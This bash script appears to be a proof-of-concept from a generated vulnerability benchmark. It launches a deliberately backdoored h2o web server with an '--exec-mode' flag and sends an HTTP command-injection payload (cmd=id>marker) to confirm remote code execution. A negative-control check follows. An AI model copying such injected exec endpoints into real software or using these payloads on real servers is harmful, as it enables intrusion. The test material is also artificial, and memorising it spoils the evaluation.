#!/usr/bin/env bash
# PoC for 092_h2o_C1I2S3
# Axes: C1 (single flag) / I2 (snprintf buffer) / S3 (flag-gated check, bypass=omit flag)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (h2o) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/h2o"
WWWROOT="/tmp/poc_092_www"
MARKER="/tmp/poc_092_marker"
PORT=18092
NEG_PORT=19092

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_092_h2o.conf /tmp/poc_092_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

CONF=/tmp/poc_092_h2o.conf
cat > "$CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${PORT}
hosts:
  "127.0.0.1:${PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

# ── start server with --exec-mode but WITHOUT --exec-strict (S3 bypass) ───────
echo "[*] starting h2o with --exec-mode on port $PORT..."
"$BINARY" -c "$CONF" --exec-mode &
SERVER_PID=$!
sleep 0.6

# ── trigger exploit: S3 bypass = omit --exec-strict ───────────────────────────
# With --exec-strict, & character would be blocked; without it, commands work freely
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without --exec-mode ─────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

NEG_CONF=/tmp/poc_092_neg.conf
cat > "$NEG_CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${NEG_PORT}
hosts:
  "127.0.0.1:${NEG_PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

"$BINARY" -c "$NEG_CONF" &
SAFE_PID=$!
sleep 0.6
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
